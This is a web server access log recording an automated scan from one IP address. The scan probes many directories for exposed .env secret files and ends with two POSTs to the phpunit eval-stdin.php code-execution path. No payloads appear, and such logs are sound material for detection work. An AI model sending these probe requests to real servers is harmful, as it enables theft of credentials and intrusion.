192.9.237.155 - - [07/Jan/2022:20:08:02 +0000] "GET //apps/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:02 +0000] "GET //uploads/.env HTTP/1.1" 301 239 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:03 +0000] "GET //sitemaps/.env HTTP/1.1" 301 240 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:03 +0000] "GET //saas/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:03 +0000] "GET //api/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:04 +0000] "GET //psnlink/.env HTTP/1.1" 301 239 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:04 +0000] "GET //exapi/.env HTTP/1.1" 301 237 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:04 +0000] "GET //site/.env HTTP/1.1" 301 236 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:04 +0000] "GET //admin/.env HTTP/1.1" 301 237 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:05 +0000] "GET //web/.env HTTP/1.1" 301 235 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:05 +0000] "GET //public/.env HTTP/1.1" 301 238 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:06 +0000] "GET //en/.env HTTP/1.1" 301 234 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:06 +0000] "GET //tools/.env HTTP/1.1" 301 237 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:06 +0000] "GET //v1/.env HTTP/1.1" 301 234 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:07 +0000] "GET //v2/.env HTTP/1.1" 301 234 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:07 +0000] "GET //administrator/.env HTTP/1.1" 301 245 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:07 +0000] "GET //laravel/.env HTTP/1.1" 301 239 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:08 +0000] "POST / HTTP/1.1" 301 227 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:08 +0000] "POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 283 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
192.9.237.155 - - [07/Jan/2022:20:08:08 +0000] "POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 281 "https://www.google.com/" "Mozilla/5.0 (Linux i386; X11) Gecko/20060510 Firefox/16.0"
